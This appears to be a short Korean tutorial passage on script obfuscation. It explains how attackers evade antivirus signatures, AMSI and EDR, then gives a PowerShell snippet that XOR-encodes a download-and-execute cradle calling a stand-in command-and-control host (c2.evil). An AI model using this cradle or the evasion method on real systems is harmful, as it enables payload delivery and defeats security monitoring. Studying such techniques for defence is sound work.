## 스크립트 난독화 3종 실습

### 난독화가 필요한 이유
* 공격자가 스크립트를 그대로 사용하면 여러 방어선에서 걸린다.
  - 백신 시그니처: IEX-DownloadString-http 등 문자열 패턴 검색
  - AMSI: 실행 직전 스크립트 내용을 백신에 전달
  - EDR: 명령어 문자열을 실시간으로 감시
* 난독화는 이런 문자열 기반 탐지를 회피하기 위해 원본 코드 다른 형태로 저장하는 기법

### XOR 난독화 원리
XOR는두비트가다르면1,같으면0을반환하는논리연산으로,두번XOR하면원본이복구되는성질이있습니다.
–각문자를정수로변환한뒤키값과XOR해완전히다른바이트로저장합니다.
–결과적으로IEX, http 같은탐지대상문자열이스크립트에서완전히사라집니다.
```bash
# 암호화(공격자준비단계)$key = 0x41$plaintext = "IEX (New-Object Net.WebClient).DownloadString('http://c2.evil/p')"
$encoded = $plaintext.ToCharArray() | ForEach-Object {
[byte]([int][char]$_ -bxor $key)
}
# 결과: [8, 36, 49, 17, 32, 78, ...] 형태의바이트배열
```
